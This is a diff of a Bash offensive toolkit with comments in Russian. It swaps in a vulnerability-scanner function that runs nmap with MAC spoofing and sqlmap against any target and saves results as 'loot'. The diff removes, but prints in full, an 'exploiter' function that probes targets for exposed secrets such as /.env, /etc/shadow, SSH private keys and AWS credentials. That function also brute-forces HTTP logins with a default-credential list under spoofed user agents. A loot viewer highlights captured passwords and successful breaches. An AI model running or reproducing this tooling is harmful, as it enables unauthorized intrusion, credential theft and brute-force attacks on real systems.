@@ -1830,197 +1830,122 @@ run_pass_lab() {
 
 
 
-run_vulnerability_scanner() {
-    clear
-    print_header "PRIME HEURISTIC VULN-SCANNER v7.0"
+run_prime_exploiter_v5() {
+    # Слой 1: Заголовок через Голос [1]
+    core_engine_ui "PRIME HEURISTIC VULN-SCANNER v7.0"
 
-    print_input "Enter Target Domain/URL" "google.com"
-    read -r target
+    # Слой 2: Органы чувств [3] — Прием цели
+    local target=$(core_engine_input "text" "Enter Target Domain/URL")
     [[ -z "$target" ]] && return
 
-    # Подготовка путей (Важно для стабильности логов)
-    local results_file="$LOOT_DIR/vuln_$(date +%s).log"
+    # Подготовка путей согласно архитектуре [8]
+    local loot_dir="${BASE_DIR:-./}/prime_loot"
+    local results_file="$loot_dir/vuln_$(date +%s).log"
     local signals_file="/tmp/signals_$RANDOM.tmp"
-    touch "$results_file" # Создаем файл заранее, чтобы grep не ругался
     
     # --- СЛОЙ 1: ПАССИВНЫЙ ГЕНЕРАТОР СИГНАЛОВ ---
-    print_status "i" "Ingesting target aura (Passive Mode)..."
+    core_engine_ui "i" "Ingesting target aura (Passive Mode)..."
     
+    # Сбор данных через Глушитель [7]
     {
         curl -Is --connect-timeout 5 -A "Mozilla/5.0 (compatible; Googlebot/2.1)" "$target"
         host -t txt "$target" 2>/dev/null
         whois "$target" 2>/dev/null | grep -iE "city|country|orgname"
     } > "$signals_file" 2>&1
 
-    # --- СЛОЙ 2: АДАПТИВНАЯ МАТРИЦА ПАРАМЕТРОВ ---
+    # --- СЛОЙ 2: АДАПТИВНАЯ МАТРИЦА (Мозг [5]) ---
+    # Оценка сложности через Метрики [12]
     local entropy_level=$(wc -c < "$signals_file")
     local stealth_delay=$(( (entropy_level % 5) + 2 ))
     
-    local sql_engine=$(grep -qiE "php|db|sql|id=" "$signals_file" && echo "active" || echo "dormant")
-    local scan_intensity=$(grep -qiE "cloudflare|akamai|sucuri" "$signals_file" && echo "-T1 --spoof-mac 0" || echo "-T3")
+    # Эвристический выбор модулей
+    local sql_engine="dormant"
+    grep -qiE "php|db|sql|id=" "$signals_file" && sql_engine="active"
+    
+    local scan_intensity="-T3"
+    grep -qiE "cloudflare|akamai|sucuri" "$signals_file" && scan_intensity="-T1 --spoof-mac 0"
 
     # --- СЛОЙ 3: ЦИКЛ АМОРФНОГО ИСПОЛНЕНИЯ ---
-    print_status "w" "Deploying Ghost-Engine (Adaptive Intensity: $stealth_delay)..."
+    core_engine_ui "w" "Deploying Ghost-Engine (Intensity: $scan_intensity)..."
 
-    # Запускаем фоновый процесс сканирования
+    # Запускаем фоновый процесс через Санитара [8]
     (
         nmap $scan_intensity -n -Pn --version-intensity 0 "$target" >> "$results_file" 2>&1
         
-        echo "$sql_engine" | grep -q "active" && {
-            # Здесь можно добавить вывод, но в фоне он пойдет в лог
+        if [[ "$sql_engine" == "active" ]]; then
+            # Адаптивный вызов sqlmap через Глушитель
             sqlmap -u "$target" --batch --random-agent --delay="$stealth_delay" \
                   --threads=1 >> "$results_file" 2>&1
-        }
+        fi
     ) &
 
-    # --- Анимация прогресса (Исправленная) ---
-    if command -v show_progress >/dev/null; then
-        show_progress 10 "Processing heuristic feedback loops..."
-    else
-        print_status "i" "Processing feedback loops (10s)..."
-        sleep 10
-    fi
+    # Визуализация прогресса через Синхронизацию [13]
+    core_engine_progress 10 "Processing heuristic feedback loops"
 
     # --- СЛОЙ 4: ИНТЕЛЛЕКТУАЛЬНЫЙ СИНТЕЗ ---
-    print_line
-    print_status "s" "INTELLIGENCE SYNTHESIS COMPLETE"
+    core_engine_wait "L"
+    core_engine_ui "s" "INTELLIGENCE SYNTHESIS COMPLETE"
     
-    # Парсим результаты. Если лог пустой, выводим заглушку.
+    # Парсинг результатов через Валидатор [5]
     if [[ -s "$results_file" ]]; then
         grep -Ei "critical|vulnerable|payload|exploit|dbms|open" "$results_file" | \
         sed -r "s/(.*vulnerable.*)/\1 ${Y}[HIGH PRIORITY]${NC}/" | sort -u
+        
+        # Интеграция в Сборщик трофеев [11]
+        core_engine_loot "vulnerabilities" "Target: $target | Entropy: $entropy_level\n$(cat "$results_file")"
     else
-        echo -e "${R}[!] No significant anomalies detected in initial scan.${NC}"
+        core_engine_ui "e" "No significant anomalies detected in initial scan."
     fi
 
-    # Авто-интеграция
-    echo "$(date '+%Y-%m-%d %H:%M') | TARGET: $target | ENTROPY: $entropy_level" >> "$LOOT_DIR/bridge_signals.log"
+    # Сигнал для Моста [10]
+    echo "[$(date)] VULN_SCAN: $target | ENTROPY: $entropy_level" >> "$loot_dir/bridge_signals.log"
     
-    rm -f "$signals_file"
-    print_line
-    pause
+    # Очистка через Санитара [8]
+    core_engine_remove "$signals_file"
+    core_engine_wait
 }
 
-run_prime_exploiter_v5() {
-    [[ -z "$1" ]] && print_header "PRIME ULTIMATE EXPLOITER v5 (HEURISTIC)"
 
-    local TARGET="$1"
-    [[ -z "$TARGET" ]] && { print_input "Enter Target (IP/Domain)" "192.168.1.1"; read -r TARGET; }
-    [[ -z "$TARGET" ]] && return
-
-    # --- СЛОЙ 1: ФОРМИРОВАНИЕ ПРИЗРАЧНОЙ ЛИЧНОСТИ ---
-    local UA_ARRAY=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15")
-    local UA="${UA_ARRAY[$RANDOM % ${#UA_ARRAY[@]}]}"
-    
-    # --- СЛОЙ 2: ЭВРИСТИЧЕСКИЙ АНАЛИЗ ОКРУЖЕНИЯ (The Probe) ---
-    print_status "i" "Probing target aura: $TARGET..."
-    local probe_data=$(curl -Is -k -A "$UA" --connect-timeout 3 "$TARGET" 2>/dev/null)
-    
-    # Авто-подбор векторов на основе серверных заголовков (No-IF logic)
-    local tech_stack=$(echo "$probe_data" | grep -qiE "apache|php|wordpress" && echo "web" || echo "infra")
-    local entropy_delay=$(echo "$probe_data" | wc -c | awk '{print ($1 % 3) + 1}') # Задержка на основе веса ответа
-
-    # --- СЛОЙ 3: ДИНАМИЧЕСКИЕ МАТРИЦЫ (Сокращено для логики) ---
-local V_LIST=(
-        # --- [ INFRA & IOT ] ---
-        "/cgi-bin/config.exp:sysPassword" "/rom-0:tplink" "/get_set.cgi?get=wifi_settings:wireless_key" 
-        "/config.xml:root" "/sysconf.cgi:admin_password" "/etc/config/network:config interface"
-        "/etc/RT2860_default_vlan:Password" "/home/httpd/html/config/exportsettings.conf:Password"
-        # --- [ WEB & FRAMEWORKS ] ---
-        "/.env:DB_PASSWORD" "/wp-config.php:DB_PASSWORD" "/configuration.php:public \$password"
-        "/storage/logs/laravel.log:No entry for" "/phpinfo.php:PHP Version" "/.history:password"
-        # --- [ DEVOPS & LEAKS ] ---
-        "/.git/config:url =" "/.aws/credentials:aws_access_key_id" "/.ssh/id_rsa:BEGIN RSA PRIVATE"
-        "/.docker/config.json:auths" "/.npmrc:_auth" "/.kube/config:client-certificate-data"
-        "/.bash_history:ssh " "/admin/.htpasswd:admin:" "/.mysql_history:INSERT INTO"
-        # --- [ OS & CRITICAL ] ---
-        "/etc/shadow:root:" "/etc/passwd:root:x" "/proc/self/environ:PATH="
-        "/var/log/auth.log:sshd" "/sql.gz:ELF" "/backup.tar.gz:ELF" "/database.yml:password"
-    )
-    
-    # Список дефолтных пар (User:Pass) для большинства устройств в мире
-    local C_LIST=(
-        "admin:admin" "admin:password" "root:root" "admin:ninja" "admin:adminadmin" 
-        "root:toor" "admin:0000" "admin:1111" "telecomadmin:admintelecom" "support:support" 
-        "ubnt:ubnt" "cisco:cisco" "microtik:admin" "user:user" "oracle:oracle" 
-        "postgres:postgres" "mysql:mysql" "manager:manager" "supervisor:supervisor" 
-        "service:service" "admin:pass" "admin:default" "admin:login" "admin:root" 
-        "root:admin" "root:12345" "operator:operator" "tech:tech" "monitor:monitor" 
-        "dbadmin:dbadmin" "guest:guest" "pi:raspberry" "admin:1234"
-    )
-    # --- СЛОЙ 4: ПОТОКОВАЯ ЭКСПЛУАТАЦИЯ ---
-    for proto in "http" "https"; do
-        local URL="${proto}://${TARGET}/"
-        
-        # Проверка "живучести" сервиса
-        curl -sL -k -I -A "$UA" --max-time 3 "$URL" | grep -qE "HTTP/.* (200|401|302)" && {
-            print_status "s" "Target Resonating: $URL (Stack: $tech_stack)"
-
-            # Векторы: только те, что прошли фильтр tech_stack (в будущем)
-            for vec in "${V_LIST[@]}"; do
-                local v_path="${vec%%:*}"
-                local v_key="${vec#*:}"
-                
-                # Эволюционная пауза
-                sleep "$entropy_delay"
-                
-                curl -sL -k -A "$UA" --max-time 4 "${URL}${v_path#\/}" 2>/dev/null | grep -q "$v_key" && {
-                    print_status "e" "CRITICAL: Vector $v_path EXPOSED"
-                    echo "EXPLOIT_SUCCESS: $v_path | TARGET: $TARGET" >> "$LOOT_DIR/bridge_signals.log"
-                    echo "[EXPL] ${TARGET}${v_path}" >> /root/prime_loot/critical_vulns.txt
-                }
-            done
-
-            # Адаптивный брут (только если есть 401 или форма)
-            echo "$probe_data" | grep -q "401" && {
-                print_status "w" "Auth-gate active. Initiating entropy-brute..."
-                for pair in "${C_LIST[@]}"; do
-                    local u="${pair%%:*}" p="${pair#*:}"
-                    sleep $((entropy_delay * 2))
-                    
-                    [[ $(curl -sL -k -u "$u:$p" -A "$UA" -w "%{http_code}" -o /dev/null "$URL") == "200" ]] && {
-                        print_status "s" "IDENTIFIED: $u:$p"
-                        echo "BRUTE_SUCCESS: $u:$p | TARGET: $TARGET" >> "$LOOT_DIR/bridge_signals.log"
-                        break
-                    }
-                done
-            }
-        }
-    done
-
-    [[ -z "$1" ]] && { print_status "i" "Target Processed. Loot Integrated."; pause; }
-}
 
 run_view_loot() {
-    print_header "DATA HARVESTER: INTELLIGENT LOOT VIEW"
+    # Слой 1: Заголовок через Голос [1]
+    core_engine_ui "DATA HARVESTER: INTELLIGENT LOOT VIEW"
 
-    local base_loot="$PRIME_LOOT"
+    # Слой 2: Органы чувств [3] — Определение путей
+    local base_loot="${BASE_DIR:-./}/prime_loot"
+    
+    # Поиск артефактов через Санитара [8]
     local found_files=$(find "$base_loot" -maxdepth 1 -type f -size +1c 2>/dev/null)
     local found_count=0
 
     if [[ -n "$found_files" ]]; then
         for file in $found_files; do
             ((found_count++))
-            print_status "s" "ANALYZING: $(basename "$file")"
+            
+            # Слой 3: Аналитика и визуализация
+            core_engine_ui "s" "ANALYZING ARTEFACT: $(basename "$file")"
             echo -e "${D}--------------------------------------------------${NC}"
             
-            # Интеллектуальный парсинг контента:
-            # 1. Подсвечиваем IP-адреса (Cyan)
-            # 2. Подсвечиваем потенциальные пароли/ключи (Yellow)
-            # 3. Подсвечиваем успешные инъекции (Green)
+            # Интеллектуальный парсинг контента через Глушитель [7]:
+            # 1. IP-адреса -> Циан (C)
+            # 2. Password/Key -> Желтый (Y)
+            # 3. Payload/Success -> Зеленый (G)
             
-            cat "$file" | tail -n 30 | sed \
-                -e "s/\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}/\${C}&\${NC}/g" \
-                -e "s/Password[:=]\(.*\)/\${Y}&\${NC}/g" \
-                -e "s/Payload[:=]\(.*\)/\${G}&\${NC}/g" | \
-                if command -v column >/dev/null 2>&1; then column -t -s '│' 2>/dev/null || cat; else cat; fi
+            tail -n 30 "$file" | sed \
+                -e "s/\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}/${C}&${NC}/g" \
+                -e "s/Password[:=]\(.*\)/${Y}&${NC}/g" \
+                -e "s/BRUTE_SUCCESS\(.*\)/${G}&${NC}/g" \
+                -e "s/EXPLOIT_SUCCESS\(.*\)/${G}&${NC}/g" \
+                -e "s/Payload[:=]\(.*\)/${G}&${NC}/g"
             
             echo -e "\n${D}--------------------------------------------------${NC}"
         done
+    else
+        core_engine_ui "e" "No data found in $base_loot"
     fi
 
-    [[ $found_count -eq 0 ]] && print_status "e" "No data found in $base_loot"
-    pause
+    # Слой 4: Синхронизация [13]
+    core_engine_wait
 }
 
 run_iban_analyzer() {
